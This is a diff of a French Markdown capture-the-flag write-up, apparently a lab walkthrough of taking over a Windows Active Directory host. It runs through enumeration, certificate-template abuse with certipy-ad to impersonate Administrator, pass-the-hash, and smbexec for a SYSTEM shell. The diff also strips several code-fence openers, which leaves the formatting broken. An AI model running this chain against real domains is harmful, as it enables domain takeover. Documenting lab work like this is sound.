@@ -1,6 +1,3 @@
-Merci pour ce partage du texte ! Je vois ce que tu veux dire : le texte est dense, un peu « tout collé », et pas très agréable à lire sur une page web.
-
-Je te propose un **exemple simple de mise en forme Markdown claire et structurée** qui facilitera la lecture, avec titres, listes, blocs de code, et emojis pour une lecture fluide.
 
 ---
 
@@ -23,7 +20,6 @@ Exploiter une machine Windows Active Directory vulnérable (`labyrinth.thm.local
 
 ### 🔎 Scan Nmap
 
-```bash
 nmap -Pn -sC -sV -T4 -p- labyrinth.thm.local
 ````
 
@@ -35,12 +31,11 @@ nmap -Pn -sC -sV -T4 -p- labyrinth.thm.local
 Ajout dans `/etc/hosts` :
 
 ```
-labyrinth.thm.local thm.local LABYRINTH
+<IP> labyrinth.thm.local thm.local LABYRINTH
 ```
 
 ### 🧪 Tests d'accès invités
 
-```bash
 nxc smb labyrinth.thm.local -u 'guest' -p ''
 nxc ldap labyrinth.thm.local -u 'guest' -p '' --users
 ```
@@ -49,7 +44,6 @@ nxc ldap labyrinth.thm.local -u 'guest' -p '' --users
 
 ### 🔐 Accès initial
 
-```bash
 nxc smb labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p '[REDACTED]'
 ```
 
@@ -63,7 +57,7 @@ Utilisation de Remmina pour ouvrir un accès graphique RDP.
 
 ### 🔬 Découverte de la vulnérabilité
 
-```bash
+
 certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p '[REDACTED]' -target labyrinth.thm.local -stdout -vulnerable
 ```
 
@@ -80,7 +74,6 @@ certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p '[REDACTED]' -target labyrint
 
 ### 📥 Requête de certificat en se faisant passer pour l’administrateur
 
-```bash
 certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password '[REDACTED]' \
   -ca thm-LABYRINTH-CA -template ServerAuth \
   -target labyrinth.thm.local -upn Administrator@thm.local
@@ -90,7 +83,6 @@ certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password '[REDACTED]' \
 
 ### 🪪 Authentification avec le certificat
 
-```bash
 certipy-ad auth -pfx administrator.pfx
 ```
 
@@ -100,7 +92,6 @@ certipy-ad auth -pfx administrator.pfx
 
 ## 🔁 3. Test du hash NTLM (Pass-the-Hash)
 
-```bash
 cme smb labyrinth.thm.local -u Administrator -H 07d677XXXXXXX322 --kdcHost labyrinth.thm.local
 ```
 
@@ -110,7 +101,6 @@ cme smb labyrinth.thm.local -u Administrator -H 07d677XXXXXXX322 --kdcHost labyr
 
 ## 🚀 4. Exécution de commande à distance (Shell SYSTEM)
 
-```bash
 smbexec.py -k -hashes :07d677XXXXXXX322 THM.LOCAL/Administrator@labyrinth.thm.local
 ```
 
